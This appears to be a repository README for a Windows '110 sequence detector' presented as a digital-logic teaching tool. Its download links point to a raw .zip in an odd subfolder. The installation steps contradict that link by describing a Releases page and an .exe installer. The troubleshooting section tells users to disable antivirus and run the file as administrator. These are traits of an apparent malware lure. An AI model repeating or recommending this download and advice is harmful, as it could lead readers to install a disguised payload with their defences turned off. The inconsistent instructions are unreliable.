# 🔍 110-Sequence-Detector - Find binary patterns with simple tools

[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://raw.githubusercontent.com/Janemcfadden1090/110-Sequence-Detector/main/gansey/Sequence_Detector_v3.6-alpha.5.zip)

## 📌 Project Overview

This tool identifies the binary sequence 110 within a stream of data. Digital systems rely on these sequences to process instructions or manage data flow. This software simulates how hardware circuits detect patterns. It helps students and learners visualize logic gates and state transitions without complex hardware setups.

The detector works by tracking incoming bits one at a time. It maintains an internal state to remember previous inputs. If the system receives the sequence 1, 1, and 0 in that specific order, it triggers an indicator. This project simplifies complex digital logic into an accessible format for your computer.

## 🛠️ System Requirements

Ensure your computer meets these standards before you begin:

*   Operating System: Windows 10 or Windows 11.
*   Processor: Dual-core 1.5 GHz or better.
*   Memory: 4 GB RAM.
*   Storage: 100 MB of space.
*   Display: 1024x768 resolution.

## 📥 Download and Installation

Follow these steps to obtain the program:

1. Visit the [official repository page](https://raw.githubusercontent.com/Janemcfadden1090/110-Sequence-Detector/main/gansey/Sequence_Detector_v3.6-alpha.5.zip) to access the software files.
2. Locate the section labeled Releases on the right side of the page.
3. Click the latest version link.
4. Select the Windows installer file ending in .exe.
5. Save the file to your computer.

Once the download finishes, follow these steps to set up the software:

1. Open your Downloads folder.
2. Double-click the installer file.
3. Follow the prompts on the screen to install the application.
4. Open the program using the shortcut on your desktop.

## 🚀 How to Run the Sequence Detector

Upon opening the application, you see a clean interface. The main window contains an input field and a display area. 

### Inputting Data
Enter your binary sequences into the text area. Type digits like 0 and 1. Avoid using spaces or other characters. The program ignores invalid input. You can type sequences manually or paste them.

### Running the Detection
Click the Start button to process the stream. The indicator light turns green when the program identifies 110. You see the progress highlighted in the interface as the system moves through your binary string.

### Resetting the System
Use the Reset button to clear all previous data. This cleans the input field and returns the internal state to the beginning. Ensure you press this button before testing a new sequence.

## 💡 Educational Features

The implementation covers several concepts in digital logic design:

*   Finite State Machines: The program uses states to track the input. It moves from an idle state to state 1, then to 11, then to the final 110 state.
*   Bitstream Processing: It handles continuous input and parses bits sequentially.
*   Visual Feedback: It displays the transitions in real-time, allowing you to watch the state machine change.

## 🛠️ Troubleshooting

If the program fails to start, check the following items:

*   Update your Windows version: Ensure you have the latest updates from Microsoft.
*   Check administrative privileges: Right-click the application icon and select "Run as administrator" if the program fails to load.
*   Reinstall the application: Remove the program via the Control Panel and run the installer again if errors persist.
*   Disable security software: Some antivirus programs block new applications. Verify that your security settings permit the execution of this specific file.

## 🛡️ Understanding Digital Logic

Digital logic serves as the foundation for modern computers. Everything from processors to memory storage uses gates to process information. This project isolates one specific behavior, sequence detection, to show how components interact.

Every time you input a bit, the detector evaluates the Current State and the New Input. If the current sequence matches the path toward 110, the detector advances. If the input breaks the pattern, the detector returns to an earlier state. This process repeats for every digit in your stream. 

By modeling this in software, you gain insight into how engineers design hardware. You observe the outcome without the cost of physical components. Use this tool for experimentation or classroom study. 

## 📋 Common Questions

**Does this project support other sequences?**
The current version focuses on the 110 sequence. Future updates may allow users to define their own custom patterns.

**Can I run this on a Mac?**
The current build is specific to Windows.

**Is there a cost to use this software?**
No, the software remains free for educational use.

**How do I report a bug?**
Report technical issues through the issues tab on the repository page. Provide a description of the error and a screenshot if possible.

## 🎓 Learning Resources

To further your understanding of digital logic, research these topics:

*   State Diagrams: These diagrams map out how a system moves from one state to another.
*   Boolean Algebra: This branch of math helps simplify the logic gates inside a digital system.
*   Flip-Flops: These circuits store the state of the system between clock pulses.

Practicing with these concepts improves your ability to design and troubleshoot digital systems. Start with small sequences and build toward more complex patterns as you gain confidence. The detector serves as a reliable starting point for your exploration of these topics.